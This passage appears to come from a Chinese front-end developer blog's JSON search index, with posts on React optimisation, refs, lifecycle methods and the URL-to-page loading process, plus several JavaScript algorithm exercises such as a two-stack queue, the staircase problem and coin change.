PureComponent、React.memo 进行浅比较在 React 工作流中，如果只有父组件发生状态更新，即使父组件传给子组件的所有 Props 都没有修改，也会引起子组件的 Render 过程。 如果子组件的 Props 和 State 都没有改变，那么其生成的 DOM 结构和副作用也不应该发生改变。当子组件符合声明式设计理念时，就可以忽略子组件本次的 Render 过程，PureComponent 是对类组件的 Props 和 State 进行浅比较，React.memo 是对函数组件的 Props 进行浅比较。 使用 useMemo、useCallback 实现稳定的 Props 值如果传给子组件的派生状态或函数，每次都是新的引用，那么 PureComponent 和 React.memo 优化就会失效。所以需要使用 useMemo 和 useCallback 来生成稳定值，并结合 PureComponent 或 React.memo 避免子组件重新 Render useCallback、useMemo 应配合 React.memo 使用 使用 useMemo 减少组件 Render 过程耗时useMemo 是一种缓存机制提速，当它的依赖未发生改变时，就不会触发重新计算，用于派生属性，类似于 Vue 的 computed 属性。 避免使用内联对象或内联函数函数式组件在每次 render 时都会重新的定义一个新的对象，对于 prop 的浅层比较始终返回false，导致组件一直重新渲染，包括内联样式的引用。可在组件外部定义一个对象，将该对象传递给子组件即可。内联函数也有同样的问题，每次 render 都是不一样的 列表项使用 key 属性组件合理的拆分与解耦按优先级更新，及时响应用户debounce、throttle 优化频繁触发的回调延迟加载组件","categories":[{"name":"React","slug":"React","permalink":"https://xuxb.github.io/categories/React/"}],"tags":[{"name":"React","slug":"React","permalink":"https://xuxb.github.io/tags/React/"}]},{"title":"React 和 Vue 的区别","slug":"React/React 和 Vue 的区别","date":"2021-05-26T08:32:38.000Z","updated":"2021-06-07T11:49:34.740Z","comments":true,"path":"2021/05/26/React/React 和 Vue 的区别/","link":"","permalink":"https://xuxb.github.io/2021/05/26/React/React%20%E5%92%8C%20Vue%20%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"React 和 Vue 的区别 数据是否可变 React 整体是函数式的思想，把组件设计成纯组件，状态和逻辑通过参数传入，所以在 React中，是单向数据流，推崇结合 immutable 来实现数据不可变 Vue 的思想是响应式的，也就是基于是数据可变的，通过对每一个属性建立 Watcher 来监听，当属性变化的时候，响应式的更新对应的虚拟dom。 总之，React 的性能优化需要手动去做，而 Vue 的性能优化是自动的，但是Vue的响应式机制也有问题，就是当 state 特别多的时候，Watcher 也会很多，会导致卡顿，所以大型应用（状态特别多的）一般用 React，更加可控。 通过 js 来操作一切，还是用各自的处理方式: React 的思路是all in js，通过js来生成html，所以设计了jsx，还有通过js来操作css，社区的 styled-component、jss等; Vue 是把html，css，js组合到一起，用各自的处理方式，Vue有单文件组件，可以把html、css、js写到一个文件中，html提供了模板引擎来处理。 类式的组件写法，还是声明式的写法: React是类式的写法，api 很少; Vue 是声明式的写法，通过传入各种 options，api 和参数都很多。 所以 React 结合 typescript 更容易一起写，Vue 稍微复杂。 扩展不同: React 可以通过高阶组件（Higher Order Components–HOC）来扩展， Vue 需要通过 mixins 来扩展。 功能内置: React做的事情很少，很多都交给社区去做 Vue很多东西都是内置的，写起来确实方便一些","categories":[{"name":"React","slug":"React","permalink":"https://xuxb.github.io/categories/React/"}],"tags":[{"name":"React","slug":"React","permalink":"https://xuxb.github.io/tags/React/"}]},{"title":"React 中 ref 的使用","slug":"React/React 中 ref 的使用","date":"2021-05-26T08:32:38.000Z","updated":"2021-06-07T11:47:36.201Z","comments":true,"path":"2021/05/26/React/React 中 ref 的使用/","link":"","permalink":"https://xuxb.github.io/2021/05/26/React/React%20%E4%B8%AD%20ref%20%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"React 中 ref 的使用ref 与 Refs 是两个不同的概念 ref 是一个特殊的属性，可作用于 DOM 元素或 React 元素上，用于接收 HTML 元素或组件实例，作为其 current 属性 Refs 是 React 提供的可用特定 API 创建的一个对象，可以用 React.creatRef() 、React.useRef() 创建，生成的对象类似于 &#123; current: null &#125;，用于赋值给 DOM 元素 或 React 元素 上 适合使用 refs 的几种情况 管理焦点，文本选择或媒体播放 触发强制动画 集成第三方 DOM 库 React 为提供了直接访问 DOM元素 和 React 元素的方式，就是通过 Refs。使用的方式很简单，就是为想要访问的元素上添加 ref 属性，将 Refs 对象附加到 ref 属性上，那么此时 Refs 对象的 current 属性就不再是空，而是对应的 DOM元素 或 React 元素实例 React.createRef()使用 React.createRef() 的方式可以创建一个 Ref 对象，可通过附加到 ref 属性上访问一个 原生DOM元素 或者 class 组件。这种方式可以在函数组件和class 组件中使用。 React.useRef(initialValue)React.useRef() 返回一个可变的 Ref 对象，其 .current 属性被初始化为传入的参数 initialValue。返回的 Refs 对象在组件的整个生命周期内保持不变。这种方式只能在函数组件中使用。 ref 属性只能被添加到原生 DOM元素 或者 React的 class 组件上。不能在直接函数组件 上使用 ref 属性，因为函数组件没有实例。若想在函数组件上使用 ref 属性，可以通过 React.forwardRef 将 Ref 转发到函数组件内部 当 ref 属性接收 Ref 对象时，会将其对应的 DOM元素 或者 class组件实例 直接赋值给 Ref 对象中的 current 属性上。而当 ref 属性接收一个回调函数时，会将其对应的 DOM元素 或 class组件实例作为回调函数的参数调用回调函数。 1. React.createRef()React.createRef 主要用在 class 组件中，用于创建 Refs 对象，用来保存和引用一些值，并且修改这个属性不会触发组件更新。 123456789101112class MyComponent extends React.Component &#123; constructor(props) &#123; super(props); this.myRef = React.createRef(); &#125; componentDidMount() &#123; this.myRef.current.focus(); &#125; render() &#123; return &lt;input ref=&#123;this.myRef&#125; /&gt;; &#125;&#125; 2. React.useRef()React.useRef() 作为 react hooks 的一种，主要用在函数组件中。 React.useRef() 返回一个可变的 Ref 对象，其 .current 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的整个生命周期内保持不变，所以可用于保存 React 组件、DOM 元素或普通 js 对象的值 默认情况下，不能在函数组件上使用 ref 属性，因为函数组件没有示例，所以以下代码不能正常运行 函数组件中 state 变化时，会重新创建、初始化所有的变量和表达式，故不能使用 React.createRef() 12345678910111213141516// 不能正常运行function MyFunctionComponent() &#123; return &lt;input /&gt;;&#125;class Parent extends React.Component &#123; constructor(props) &#123; super(props); this.textInput = React.createRef(); &#125; render() &#123; return ( &lt;MyFunctionComponent ref=&#123;this.textInput&#125; /&gt; ); &#125;&#125; 如果要在函数组件中使用 ref，可以使用 React.forwardRef（可与 useImperativeHandle 结合使用） 123456789101112131415161718192021222324// 可以正常运行function MyFunctionComponent(props, ref) &#123; React.useImperativeHandle(ref, () =&gt; (&#123; onCheck, &#125;)); const onCheck = () =&gt; &#123;&#125;; return &lt;input /&gt;;&#125;const NewMyFunctionComponent = React.forwardRef(MyFunctionComponent)class Parent extends React.Component &#123; constructor(props) &#123; super(props); this.textInput = React.createRef(); &#125; render() &#123; return ( &lt;MyFunctionComponent ref=&#123;this.textInput&#125; /&gt; ); &#125;&#125; 总之，在函数组件内部使用 ref 属性，只能指向一个 DOM 元素或 class 组件 123456789101112131415161718192021function CustomTextInput(props) &#123; // 这里必须声明 textInput，这样 ref 才可以引用它 const textInput = useRef(null); function handleClick() &#123; textInput.current.focus(); &#125; return ( &lt;div&gt; &lt;input type=&quot;text&quot; ref=&#123;textInput&#125; /&gt; &lt;input type=&quot;button&quot; value=&quot;Focus the text input&quot; onClick=&#123;handleClick&#125; /&gt; &lt;/div&gt; );&#125; 3. React.forwardRef()React.forwardRef 主要用于穿过父元素直接获取子元素的 ref。HOC（higher-order component）在 ref 使用上会存在问题，HOC 的 ref 是无法通过 props 进行传递的，因此无法直接获取被包裹组件（WrappedComponent），所以需要进行中转。 123456789101112131415161718192021222324252627282930function HOCProps(WrappedComponent) &#123; class HOCComponent extends React.Component &#123; constructor(props) &#123; super(props); this.setWrappedInstance = this.setWrappedInstance.bind(this); &#125; getWrappedInstance() &#123; return this.wrappedInstance; &#125; // 实现 ref 的访问 setWrappedInstance(ref) &#123; this.wrappedInstance = ref; &#125; render() &#123; return &lt;WrappedComponent ref=&#123;this.setWrappedInstance&#125; &#123;...this.props&#125; /&gt;; &#125; &#125; return HOCComponent;&#125;const App = HOCProps(Wrap);&lt;App ref=&#123;(dom) =&gt; &#123; console.log(dom); // 只能获取到 HOCComponent console.log(dom.getWrappedInstance()); // 通过中转后可以获取到 WrappedComponent&#125;&#125; /&gt; 利用 forwardRef 能直接穿透 HOCComponent 获取到 WrappedComponent React.forwardRef 的原理其实非常简单，forwardRef 会生成 react 内部一种较为特殊的 Component。当进行创建更新操作时，会将 forwardRef 组件上的 props 与 ref 直接传递给提前注入的 render 函数，来生成 children。 1234567891011121314151617181920function HOCProps(WrappedComponent) &#123; class HOCComponent extends React.Component &#123; render() &#123; const &#123; forwardedRef, ...rest &#125; = this.props; return &lt;WrappedComponent ref=&#123;forwardedRef&#125; &#123;...rest&#125; /&gt;; &#125; &#125; return React.forwardRef((props, ref) =&gt; &#123; return &lt;HOCComponent forwardedRef=&#123;ref&#125; &#123;...props&#125; /&gt;; &#125;);&#125;const App = HOCProps(Wrap);&lt;App ref=&#123;(dom) =&gt; &#123; // 可以直接获取 WrappedComponent console.log(dom);&#125;&#125; /&gt; 4. React.useImperativeHandle()useImperativeHandle(ref, createHandle, [deps]) useImperativeHandle 可以让你在使用 ref 时自定义暴露给父组件的实例值。useImperativeHandle 应当与 forwardRef 一起使用. 123456789101112function FancyInput(props, ref) &#123; const inputRef = useRef(); useImperativeHandle(ref, () =&gt; (&#123; focus: () =&gt; &#123; inputRef.current.focus(); &#125; &#125;)); return &lt;input ref=&#123;inputRef&#125; /&gt;;&#125;FancyInput = forwardRef(FancyInput); 在本例中，渲染 &lt;FancyInput ref=&#123;inputRef&#125; /&gt; 的父组件可以调用 inputRef.current.focus()。 5. callback ref当 ref 属性接收一个回调函数时，会将其对应的 DOM元素 或 class 组件实例作为回调函数的参数调用回调函数。因此我们可以通过回调 Refs 的方式不依靠 Ref 对象，更灵活地控制要访问的元素或实例 callback ref 采用了组件 render 过程中在闭包函数中分配 ref 的模式，通常会使用内联函数的形式，那么每次渲染都会重新创建，由于 react 会清理旧的 ref 然后设置新的，因此更新期间会调用两次，第一次为 null，如果在 callback 中带有业务逻辑的话，可能会出错，当然可以通过将 callback 定义成类成员函数并进行绑定的方式避免。 12345678910class MyComponent extends React.Component &#123; componentDidMount() &#123; this.myRef.focus(); &#125; render() &#123; return &lt;input ref=&#123;(ele) =&gt; &#123; this.myRef = ele; &#125;&#125; /&gt;; &#125;&#125; 6. string ref (不再建议使用)React 官方文档直接提出 string ref 将会在未来版本被移出，建议用户使用 callback ref 来代替 123456789// string refclass MyComponent extends React.Component &#123; componentDidMount() &#123; this.refs.myRef.focus(); &#125; render() &#123; return &lt;input ref=&quot;myRef&quot; /&gt;; &#125;&#125; string ref 存在以下问题： 存在性能问题：当 ref 定义为 string 时，需要 React 追踪当前正在渲染的组件，在 reconciliation 阶段，React Element 创建和更新的过程中，ref 会被封装为一个闭包函数，等待 commit 阶段被执行，这会对 React 的性能产生一些影响。 使用 string ref 会造成 ref 挂载位置产生歧义 string ref 无法被组合，例如一个第三方库的父组件已经给子组件传递了 ref，那么我们就无法再在子组件上添加 ref 了，而 callback ref 可完美解决此问题 在根组件上使用无法生效 对于静态类型较不友好，当使用 string ref 时，必须显式声明 refs 的类型，无法完成自动推导。 编译器无法将 string ref 与其 refs 上对应的属性进行混淆，而使用 callback ref，可被混淆。 7. 总结在 class 内部通过 React.createRef() 创建 Refs 对象，在函数组件内部通过 React.useRef() 创建 Refs 对象，如果被引用的组件为函数组件，则需要通过 React.forwardRef() 和 React.useImperativeHandler() 来作处理。 父组件为 class 组件，子组件为 class 组件 —- 父组件中直接使用 React.createRef() 引用子组件实例 父组件为 class 组件，子组件为 函数组件 —- 父组件中 React.createRef()，子组件使用 React.forwardRef() 和 React.useImperativeHandler() 父组件为 函数组件，子组件为 class 组件 —- 父组件中直接使用 React.useRef() 引用子组件实例 父组件为 函数组件，子组件为 函数组件 —- 父组件中 React.useRef()，子组件使用 React.forwardRef() 和 React.useImperativeHandler()","categories":[{"name":"React","slug":"React","permalink":"https://xuxb.github.io/categories/React/"}],"tags":[{"name":"React","slug":"React","permalink":"https://xuxb.github.io/tags/React/"}]},{"title":"React 生命周期","slug":"React/React 生命周期","date":"2021-05-26T08:32:38.000Z","updated":"2021-06-07T11:49:04.148Z","comments":true,"path":"2021/05/26/React/React 生命周期/","link":"","permalink":"https://xuxb.github.io/2021/05/26/React/React%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/","excerpt":"","text":"React 生命周期旧版本生命周期 React 17 会添加异步渲染的功能，即一种可被打断的生命周期，而可以被打断的阶段正是实际 dom 挂载之前的虚拟 dom 构建阶段，也就是要被去掉的三个生命周期 componentWillMount，componentWillReceiveProps 和 componentWillUpdate，故不推荐使用 新版本生命周期 挂载阶段 constructor(props): 构造函数会最先被执行，通常在构造函数里初始化 state 对象或者给自定义方法绑定 this static getDerivedStateFromProps(nextProps, prevState): 接收父组件传递过来的 props 和组件之前的状态，返回一个对象来更新 state ，或者返回 null 来表示接收到的 props 没有变化，不需要更新 state（配合 componentDidUpdate，可以覆盖 componentWillReceiveProps 的所有用法，在 React 16.4.0 版本中：在组件实例化、接收到新的 props 、组件状态更新时会被调用） render(): render 函数是纯函数，返回需要渲染的内容 componentDidMount(prevProps, prevState, snapshot): 组件装载之后调用，此时我们可以获取到 DOM 节点并操作，比如对canvas，svg的操作，服务器请求，订阅都可以写在这个里面 更新阶段 static getDerivedStateFromProps(nextProps, prevState): 此方法在更新和挂载阶段都会被调用 shouldComponentUpdate(nextProps, nextState): 通常利用此生命周期来优化React程序性能，返回一个布尔值，true 表示会触发重新渲染，false 表示不会触发重新渲染，默认返回 true, render(): 更新阶段也会触发此生命周期 getSnapshotBeforeUpdate(prevProps, prevState): 这个方法在 render 之后，componentDidUpdate 之前调用，有两个参数 prevProps 和 prevState，表示之前的 props 和之前的 state，这个函数有一个返回值，会作为第三个参数传给 componentDidUpdate，如果不想要返回值，可以返回null，此生命周期必须与 componentDidUpdate搭配使用 componentDidUpdate(prevProps, prevState, snapshot): 该方法在 getSnapshotBeforeUpdate 方法之后被调用，有三个参数 prevProps，prevState，snapshot，表示之前的 props，之前的 state，和 snapshot。第三个参数是 getSnapshotBeforeUpdate 返回的，如果触发某些回调函数时需要用到 DOM 元素的状态，则将对比或计算的过程迁移至 getSnapshotBeforeUpdate，然后在 componentDidUpdate 中统一触发回调或更新状态。 卸载阶段 componentWillUnmount(): 当我们的组件被卸载或者销毁了就会调用，我们可以在这个函数里去清除一些定时器，取消网络请求，清理无效的DOM元素等垃圾清理工作 componentDidUpdate 钩子函数是在组件更新结束之后执行，在初始化 render 时不执行，如果在 componentDidMount 里面 setState 导致组件更新，组件更新后会执行 componentDidUpdate，此时在 componentDidUpdate 里面 setState 又会导致组件更新，造成成死循环了，如果要避免死循环，需要谨慎的在 componentDidUpdate 里面使用 setState，一般会在满足条件的情况下去使用 setState 最常见的误解就是 getDerivedStateFromProps 和 componentWillReceiveProps 只会在 props “改变”时才会调用。实际上只要父组件重新渲染时，这两个生命周期函数就会重新调用，不管 props 有没有“变化” 当外部的 props 改变时，如何再次执行请求数据？ 使用 componentWillReceiveProps （不推荐使用） 使用 getDerivedStateFromProps + componentDidUpdate 使用 key 重新加载组件 当外部的 props 改变时，如何更改状态？ 使用 getDerivedStateFromProps 使用 componentDidUpdate 使用 key 重新加载组件 setState 是同步更新还是异步更新？说明：调用 setState() 后，然后立即取 state 的值，可能并不能得到最新的值，看上去像是异步执行的。 答案: 有时表现出异步，有时表现出同步 调用 setState –&gt; 放入延迟队列 –&gt; 比较 props、state 并更新 DOM setState 的批量更新优化也是建立在“异步”（合成事件、钩子函数）之上的 在 React 的 setState 函数实现中，会根据一个变量 isBatchingUpdates 判断是直接更新 this.state 还是放到队列中延时更新，而 isBatchingUpdates 默认是 false，表示 setState 会同步更新 this.state；但是，有一个函数 batchedUpdates，该函数会把 isBatchingUpdates 修改为 true，而当 React 在调用事件处理函数(合成事件)之前就会先调用这个 batchedUpdates 将isBatchingUpdates 修改为 true，这样由 React 控制的事件处理过程 setState 不会同步更新 this.state。其他情况下，如原生事件和 setTimeout 中不会批量更新。 所以，在 React 应用中，如果在合成事件和钩子函数中调用 setState 会表现成异步，如果在原生事件和 setTimeout 中调用 setState 会表现成同步。","categories":[{"name":"React","slug":"React","permalink":"https://xuxb.github.io/categories/React/"}],"tags":[{"name":"React","slug":"React","permalink":"https://xuxb.github.io/tags/React/"}]},{"title":"mixin、hoc、render props、hooks 的比较","slug":"React/mixin、hoc、render props、hooks 的比较","date":"2021-05-26T08:32:38.000Z","updated":"2021-06-07T11:45:29.734Z","comments":true,"path":"2021/05/26/React/mixin、hoc、render props、hooks 的比较/","link":"","permalink":"https://xuxb.github.io/2021/05/26/React/mixin%E3%80%81hoc%E3%80%81render%20props%E3%80%81hooks%20%E7%9A%84%E6%AF%94%E8%BE%83/","excerpt":"","text":"mixin、hoc、render props、hooks 的比较mixin （已废弃）本质上就是将对象复制到另一个对象上，类似于 Object.assign() 缺点： 组件与 Mixin 之间存在隐式依赖 不同 mixins 之间可能会有先后顺序甚至代码冲突覆盖的问题 mixins 之间可能会有先后顺序甚至代码冲突覆盖的问题 hoc高阶组件（ higher-order component），类似于高阶组件接受一个组件作为参数，返回另一个组件 高阶函数是函数式编程中一个基本的概念，它描述了一种这样的函数：接受函数作为输入，或是返回一个函数，比如 map, reduce等都是高阶函数。 缺点： 需要在原组件上进行包裹和嵌套，如果大量使用 HOC，将会产生非常多的嵌套，使调试变得非常困难 固定的 props 可能会被覆盖. render props说明：通过 props 接受一个返回 react element 的函数，来动态决定自己要渲染的结果 缺点： 嵌套过深 写法较繁琐 hooks缺点： 额外的学习成本 在闭包场景可能会引用到旧的state、props值","categories":[{"name":"React","slug":"React","permalink":"https://xuxb.github.io/categories/React/"}],"tags":[{"name":"React","slug":"React","permalink":"https://xuxb.github.io/tags/React/"}]},{"title":"常见面试题","slug":"HTML/常见面试题","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T11:38:47.555Z","comments":true,"path":"2021/05/24/HTML/常见面试题/","link":"","permalink":"https://xuxb.github.io/2021/05/24/HTML/%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/","excerpt":"","text":"常见面试题从浏览器地址栏输入 url 到显示页面的步骤(以 HTTP 为例) 在浏览器地址栏输入 URL 浏览器查看缓存，如果请求资源在缓存中并且新鲜，跳转到转码步骤 如果资源未缓存，发起新请求 如果已缓存，检验是否足够新鲜，足够新鲜直接提供给客户端，否则与服务器进行验证。 检验新鲜通常有两个 HTTP 头进行控制Expires和Cache-Control： HTTP1.0 提供 Expires，值为一个绝对时间表示缓存新鲜日期 HTTP1.1 增加了 Cache-Control: max-age=,值为以秒为单位的最大新鲜时间 浏览器解析 URL获取协议，主机，端口，path 浏览器组装一个 HTTP（GET）请求报文 浏览器获取主机 ip 地址，过程如下： 浏览器缓存 本机缓存 hosts 文件 路由器缓存 ISP DNS 缓存 DNS 递归查询（可能存在负载均衡导致每次 IP 不一样） 打开一个 socket 与目标 IP 地址，端口建立 TCP 链接，三次握手如下： 客户端发送一个 TCP 的SYN=1，Seq=X的包到服务器端口 服务器发回SYN=1， ACK=X+1， Seq=Y的响应包 客户端发送ACK=Y+1， Seq=Z TCP 链接建立后发送 HTTP 请求 服务器接受请求并解析，将请求转发到服务程序，如虚拟主机使用 HTTP Host 头部判断请求的服务程序 服务器检查HTTP 请求头是否包含缓存验证信息如果验证缓存新鲜，返回304等对应状态码 处理程序读取完整请求并准备 HTTP 响应，可能需要查询数据库等操作 服务器将响应报文通过 TCP 连接发送回浏览器 浏览器接收 HTTP 响应，然后根据情况选择关闭 TCP 连接或者保留重用，关闭 TCP 连接的四次握手如下： 主动方发送Fin=1， Ack=Z， Seq= X报文 被动方发送ACK=X+1， Seq=Z报文 被动方发送Fin=1， ACK=X， Seq=Y报文 主动方发送ACK=Y， Seq=X报文 浏览器检查响应状态吗：是否为 1XX，3XX， 4XX， 5XX，这些情况处理与 2XX 不同 如果资源可缓存，进行缓存 对响应进行解码（例如 gzip 压缩） 根据资源类型决定如何处理（假设资源为 HTML 文档） 解析 HTML 文档，构件 DOM 树，下载资源，构造 CSSOM 树，执行 js 脚本，这些操作没有严格的先后顺序，以下分别解释 构建 DOM 树： Tokenizing：根据 HTML 规范将字符流解析为标记 Lexing：词法分析将标记转换为对象并定义属性和规则 DOM construction：根据 HTML 标记关系将对象组成 DOM 树 解析过程中遇到图片、样式表、js 文件，启动下载 构建CSSOM 树： Tokenizing：字符流转换为标记流 Node：根据标记创建节点 CSSOM：节点创建 CSSOM 树 根据 DOM 树和 CSSOM 树构建渲染树: 从 DOM 树的根节点遍历所有可见节点，不可见节点包括：1）script,meta这样本身不可见的标签。2)被 css 隐藏的节点，如display: none 对每一个可见节点，找到恰当的 CSSOM 规则并应用 发布可视节点的内容和计算样式 js 解析如下： 浏览器创建 Document 对象并解析 HTML，将解析到的元素和文本节点添加到文档中，此时document.readystate 为 loading HTML 解析器遇到没有 async 和 defer 的 script 时，将他们添加到文档中，然后执行行内或外部脚本。这些脚本会同步执行，并且在脚本下载和执行时解析器会暂停。这样就可以用 document.write()把文本插入到输入流中。同步脚本经常简单定义函数和注册事件处理程序，他们可以遍历和操作 script 和他们之前的文档内容 当解析器遇到设置了async属性的 script 时，开始下载脚本并继续解析文档。脚本会在它下载完成后尽快执行，但是解析器不会停下来等它下载。异步脚本**禁止使用 document.write()**，它们可以访问自己 script 和之前的文档元素 当文档完成解析，document.readState 变成 interactive 所有defer脚本会按照在文档出现的顺序执行，延迟脚本能访问完整文档树，禁止使用 document.write() 浏览器在 Document 对象上触发 DOMContentLoaded 事件 此时文档完全解析完成，浏览器可能还在等待如图片等内容加载，等这些内容完成载入并且所有异步脚本完成载入和执行，document.readState 变为 complete,window 触发 load 事件 显示页面（HTML 解析过程中会逐步显示页面）","categories":[{"name":"面试题","slug":"面试题","permalink":"https://xuxb.github.io/categories/%E9%9D%A2%E8%AF%95%E9%A2%98/"}],"tags":[{"name":"面试题","slug":"面试题","permalink":"https://xuxb.github.io/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"}]},{"title":"两个栈实现队列","slug":"算法题/两个栈实现队列","date":"2021-05-24T08:32:28.000Z","updated":"2021-05-31T08:20:55.256Z","comments":true,"path":"2021/05/24/算法题/两个栈实现队列/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/","excerpt":"","text":"两个栈实现队列123456789101112131415161718192021222324var CQueue = function () &#123; this.stackA = []; this.stackB = [];&#125;;CQueue.prototype.appendTail = function (value) &#123; this.stackA.push(value);&#125;;CQueue.prototype.deleteHead = function () &#123; if (this.stackB.length) &#123; return this.stackB.pop(); &#125; else &#123; while (this.stackA.length) &#123; this.stackB.push(this.stackA.pop()); &#125; if (!this.stackB.length) &#123; return -1; &#125; else &#123; return this.stackB.pop(); &#125; &#125;&#125;;","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"}]},{"title":"环","slug":"算法题/环","date":"2021-05-24T08:32:28.000Z","updated":"2021-05-31T08:20:44.373Z","comments":true,"path":"2021/05/24/算法题/环/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E7%8E%AF/","excerpt":"","text":"环判断链表是否有环如果链表有环，求环的长度如果链表有环，求环的入环点最小栈最大公约数二进制操作","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"}]},{"title":"最长递增序列","slug":"算法题/最长递增序列","date":"2021-05-24T08:32:28.000Z","updated":"2021-05-31T08:21:25.275Z","comments":true,"path":"2021/05/24/算法题/最长递增序列/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E5%BA%8F%E5%88%97/","excerpt":"","text":"最长递增序列Q: 无序数组 &amp; 不用连续 &amp; 递增为 1 的数字长度 如 [1,3,5,4]，则 3,4,5 满足要求，返回 3 123456789101112131415161718192021222324252627var findLengthOfLCIS = function(nums) &#123; if (!nums.length) return 0; let res = 1; let max = 1; nums.sort((a, b) =&gt; a - b); for (let i = 0; i &lt; nums.length; i++) &#123; if (i === 0) continue; if (nums[i] === nums[i - 1] + 1) &#123; max++; res = Math.max(res, max); &#125; else &#123; max = 1; &#125; console.log(res); &#125; return res;&#125;;console.log(findLengthOfLCIS([1,3,5,4,7])); // 3console.log(findLengthOfLCIS([1,3,15,4,7,2])); // 4console.log(findLengthOfLCIS([2, 2,2 ,2])); // 1","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"}]},{"title":"上台阶问题","slug":"算法题/上台阶问题","date":"2021-05-24T08:32:28.000Z","updated":"2021-05-31T08:21:03.625Z","comments":true,"path":"2021/05/24/算法题/上台阶问题/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E4%B8%8A%E5%8F%B0%E9%98%B6%E9%97%AE%E9%A2%98/","excerpt":"","text":"上台阶问题有一座高度是 n 级台阶的楼梯，从下往上走，每跨一步只能向上 1 级或者 2 级台阶。要求用程序来求出一共有多少种走法 1234567// 递归const fn = (n) =&gt; &#123; if (n === 1) return 1; if (n === 2) return 2; return fn(n - 1) + f(n -2)&#125; 12345678910111213// 备忘录const fn = (n) =&gt; &#123; const memo = &#123; 1: 1, 2: 2, &#125;; for (let i = 3; i &lt;= n; i++) &#123; memo[i] = memo[i - 1] + memo[i - 2]; &#125; return memo[n];&#125;; 1234567891011121314151617// 动态规划const fn = (n) =&gt; &#123; if (n === 1) return 1; if (n === 2) return 2; let a = 1; // 上上一步的结果 let b = 2; // 上一步的结果 let res = 0; // 当前步的结果 for (let i = 3; i &lt;= n; i++) &#123; res = a + b; a = b; b = res; &#125; return res;&#125;;","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"}]},{"title":"技巧篇 - 动态规划 - 硬币找零问题","slug":"算法题/动态规划 - 硬币找零问题","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T10:06:47.812Z","comments":true,"path":"2021/05/24/算法题/动态规划 - 硬币找零问题/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%20-%20%E7%A1%AC%E5%B8%81%E6%89%BE%E9%9B%B6%E9%97%AE%E9%A2%98/","excerpt":"","text":"技巧篇 - 动态规划 - 硬币找零问题最少硬币找零问题是给出要找零的钱数，以及可用的硬币面额d1… dn及其数量， 找到所需的最少的硬币个数。 例如， 美国有以下面额（ 硬币）： d1 = 1， d2 = 5， d3 = 10， d4 = 25。如果要找36美分的零钱， 我们可以用1个25美分、 1 个10美分和1个便士（ 1 美分）。 123456789101112131415161718192021222324252627282930313233343536function makeMinCoins (coinsArr) &#123; let coins = coinsArr; let cache = &#123;&#125;; return function markChange (amount) &#123; if (!amount) &#123; return []; &#125; if (cache[amount]) &#123; return cache[amount]; &#125; let res = []; for (let coin of coins) &#123; let newAmount = amount - coin; let newMin; if (newAmount &gt;= 0) &#123; newMin = markChange(newAmount); &#125; // `newMin.length + 1 &lt; res.length` 在多个结果中寻找最优解 // `newMin.length || !newAmount` 保证结果是合理值 if (newAmount &gt;= 0 &amp;&amp; (newMin.length + 1 &lt; res.length || !res.length) &amp;&amp; (newMin.length || !newAmount)) &#123; res = [coin].concat(newMin); &#125; &#125; console.log(`amount: $&#123;amount&#125; ---&gt; markChange : $&#123;res&#125; `); return (cache[amount] = res); &#125;;&#125;let markChange = makeMinCoins([1, 5, 8, 10, 25]);markChange(36);","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"},{"name":"技巧篇","slug":"技巧篇","permalink":"https://xuxb.github.io/tags/%E6%8A%80%E5%B7%A7%E7%AF%87/"}]},{"title":"技巧篇 - 分治法 - 接雨水问题","slug":"算法题/技巧篇 - 分治法 - 接雨水问题","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T10:05:21.337Z","comments":true,"path":"2021/05/24/算法题/技巧篇 - 分治法 - 接雨水问题/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E6%8A%80%E5%B7%A7%E7%AF%87%20-%20%E5%88%86%E6%B2%BB%E6%B3%95%20-%20%E6%8E%A5%E9%9B%A8%E6%B0%B4%E9%97%AE%E9%A2%98/","excerpt":"","text":"技巧篇 - 分治法 - 接雨水问题1234567891011121314151617181920212223242526272829303132/** * 接雨水问题 * 给定 n 